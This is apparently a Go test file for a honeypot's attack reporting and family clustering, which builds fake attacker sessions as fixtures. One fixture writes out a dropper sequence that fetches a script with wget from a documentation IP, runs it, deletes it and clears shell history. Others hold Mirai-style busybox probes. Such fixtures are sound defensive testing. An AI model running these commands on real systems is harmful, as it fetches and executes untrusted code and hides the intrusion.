package main

// Fehler aus dem Live-Check von 0.8.0-beta: Zählung im Angriffsbericht, Familien.

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// Angriffsbericht: Die Zahl der verschiedenen Kombinationen ist die echte, nicht die Länge
// der auf 40 gekürzten Liste.
func TestReportCountsAllCreds(t *testing.T) {
	base := time.Date(2026, 11, 20, 0, 51, 0, 0, time.UTC)
	var evs []*Event
	for i := range 1000 {
		e := loginEv("ssh", "root", fmt.Sprintf("pw%04d", i), nil)
		e.TS = base.Add(time.Duration(i) * time.Second)
		evs = append(evs, e)
	}
	r := BuildReport("IP 198.51.100.7", evs, false)
	if len(r.Creds) != reportMaxList || r.CredsN != 1000 {
		t.Fatalf("Liste %d, verschieden %d", len(r.Creds), r.CredsN)
	}
	sum := strings.Join(r.Summary, " ")
	if !strings.Contains(sum, "1000 Login-Versuche, jeder mit einer anderen Kombination") {
		t.Errorf("Kurzfassung: %s", sum)
	}
	// über der Obergrenze des Zählers: "über 2000"
	evs = nil
	for i := range 2100 {
		e := loginEv("ssh", "root", fmt.Sprintf("pw%05d", i), nil)
		e.TS = base.Add(time.Duration(i) * time.Second)
		evs = append(evs, e)
	}
	r = BuildReport("IP 198.51.100.7", evs, false)
	if sum := strings.Join(r.Summary, " "); !r.CredsMore || !strings.Contains(sum, "über 2000 verschiedenen Kombinationen") {
		t.Errorf("Obergrenze: %v %s", r.CredsMore, sum)
	}
	// Uhrzeiten in der eingestellten Zeitzone
	setHiveZone("Europe/Berlin")
	defer setHiveZone("")
	r = BuildReport("IP 198.51.100.7", evs[:10], false)
	if sum := strings.Join(r.Summary, " "); !strings.Contains(sum, "20.11.2026 01:51 bis") {
		t.Errorf("Zeitzone: %s", sum)
	}
}

// Ein Bot, der in jeder Sitzung eine neue Zufallskennung mitten in Wörtern benutzt
// ("check_<hex>_small_control"), bildet eine Familie, nicht viele.
func TestFamiliesEmbeddedHex(t *testing.T) {
	probe := func(id string, a, b int) []string {
		return []string{
			"sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_" + id + "_small_control'\"'\"' '\"'\"'check_" + id + "'\"'\"''",
			"printf '\\n%s|%s\\n' 'check_" + id + "_small_control' 'check_" + id + "'",
			fmt.Sprintf("printf '\\n%%s|%%s\\n' 'check_%s_small_math' \"$((%d*%d+6))\"", id, a, b),
			"printf '\\n%s|%s\\n' 'check_" + id + "_small_pid' \"$$\"",
		}
	}
	now := time.Now()
	var list []*Attack
	for i, id := range []string{"7c4d94de3cf0931616807ca1d36a2147", "005ed6c2efea0e2d836961f6c94a715a", "8e92dae83429eaa37299c5dee339c687", "230b2b7ac21346f5b6c610ef88f73d0d"} {
		list = append(list, &Attack{IP: fmt.Sprintf("203.0.113.%d", i+1), First: now.Add(-time.Duration(i+1) * time.Hour).UnixMilli(),
			Last: now.Add(-time.Duration(i+1) * time.Hour).UnixMilli(), Services: []string{"ssh"}, Commands: probe(id, 100+i*7, 400+i*13)})
	}
	// Mirai-Art: zufälliger Name hinter busybox, Wallet-Adressen
	for i, rnd := range []string{"aSkcLraK", "XmPqRtZw", "bNvCxZaS"} {
		list = append(list, &Attack{IP: fmt.Sprintf("198.51.100.%d", i+1), First: now.Add(-time.Duration(10+i) * time.Hour).UnixMilli(),
			Last: now.Add(-time.Duration(10+i) * time.Hour).UnixMilli(), Services: []string{"telnet"}, Commands: []string{"enable", "system", "shell", "sh", "/bin/busybox " + rnd}})
	}
	fams := buildFamilies(t.Context(), list, now)
	if len(fams) != 2 {
		for _, f := range fams {
			t.Logf("%s: %d", f.Name, f.Attacks)
		}
		t.Fatalf("%d Familien statt 2", len(fams))
	}
	// Normalisierung: Wörter bleiben, Zufälliges wird Platzhalter
	for in, want := range map[string]string{
		"echo check_7c4d94de3cf0931616807ca1d36a2147_small": "echo check_HEX_small",
		"echo sysde56f9f3f":                 "echo sysHEX",
		"echo deadbeefcafe":                 "echo deadbeefcafe",
		"/bin/busybox aSkcLraK":             "/bin/busybox RND",
		"systemctl NetworkManager":          "systemctl networkmanager",
		"-u 45zFhGRUgZNWPMMv7e6CLC6iZi9Emu": "-u RND",
	} {
		if got := normCommand(in); got != want {
			t.Errorf("normCommand(%q) = %q, erwartet %q", in, got, want)
		}
	}
}

// Gleich benannte, aber verschiedene Familien bekommen einen unterscheidenden Zusatz;
// eine abgebrochene Variante derselben Befehlsfolge fällt in dieselbe Familie.
func TestFamilyNamesDistinct(t *testing.T) {
	now := time.Now()
	mk := func(ip string, h int, cmds ...string) *Attack {
		ts := now.Add(-time.Duration(h) * time.Hour).UnixMilli()
		return &Attack{IP: ip, First: ts, Last: ts, Services: []string{"ssh"}, Commands: cmds}
	}
	long := []string{"cd /tmp", "wget http://198.51.100.9/x.sh", "chmod +x x.sh", "./x.sh start", "rm -f x.sh", "history -c", "cat /proc/cpuinfo", "free -m"}
	list := []*Attack{
		mk("203.0.113.1", 5, "uname -s -v -n -r -m"),
		mk("203.0.113.2", 4, "uname -s -m"),
		mk("203.0.113.3", 3, long...),
		mk("203.0.113.4", 2, long[:7]...), // bricht vor dem letzten Befehl ab
	}
	fams := buildFamilies(t.Context(), list, now)
	names := map[string]bool{}
	for _, f := range fams {
		if names[f.Name] {
			t.Errorf("Name doppelt: %s", f.Name)
		}
		names[f.Name] = true
	}
	if len(fams) != 3 {
		t.Errorf("%d Familien statt 3: %v", len(fams), names)
	}
	if !names["„uname -s -m“ über SSH"] || !names["„uname -s -v -n -r -m“ über SSH"] {
		t.Errorf("Namen: %v", names)
	}
}
